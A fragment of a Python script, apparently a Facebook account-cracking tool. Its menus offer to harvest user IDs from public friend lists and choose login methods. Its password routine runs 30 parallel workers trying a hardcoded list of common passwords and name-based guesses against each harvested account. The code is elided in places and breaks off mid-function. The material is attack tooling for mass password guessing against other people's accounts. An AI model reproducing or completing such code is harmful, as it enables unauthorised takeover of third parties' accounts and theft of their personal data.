...
def menu(my_name,my_id,my_birthday):
	...
	io = '\x1b[1;92m[01] Crack Of Public Friends (Not Recommanded)\n\x1b[1;92m[02] Crack ID From Public Account Friendlist (Recommanded) \n\x1b[1;92m[03] Cek Result Crack\n\x1b[1;92m[04] Cek Chekpoint Option\n\033[31m[00] Remove Token'
...
def dump_massal():
	...
	win2 = mark(win, style='green')
	sol().print(win2)
	print(x+'['+h+'•'+x+'] HOW MUCH IDS FRIENDLIST YOU WANT TO CLONE (UNLIMITED)')
	try:
		...
		sol().print(pesan2)
		exit()
	if jum<1 or jum>999999999999999999999:
	...
	yz = 0
	print(x+'['+h+'•'+x+'] Put UID OF PUBLIC FRIENDLIST')
...
def setting():
	...
	teks = '[01] Crack From Oldest Account (Slow)\n[02] Crack From the Youngest Account (Recommanded)\n[03] Random Order ID (Highly Recommanded)'
	...
	ioz = '[01] Method B-Api (Not Recommand)\n[02] Method Mobile (For OK ID)\n[03] Methode Free Facebook (Very slow)'
	...
	aplik = input(x+'['+p+'f'+x+'] On game option ? (y/t) : ')
	if aplik in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	osk = input(x+'['+p+'f'+x+'] On Checkpoint option? [ Not Recommended ] (y/t) : ')
	if osk in ['y','Y']:
		oprek.append('ya')
	else:
		oprek.append('no')
...
def passwrd():
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			frs = nmf.split(' ')[0]
			pwv = ['223344','786786','102030','112233','334455','778899','556677','445566','123456']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
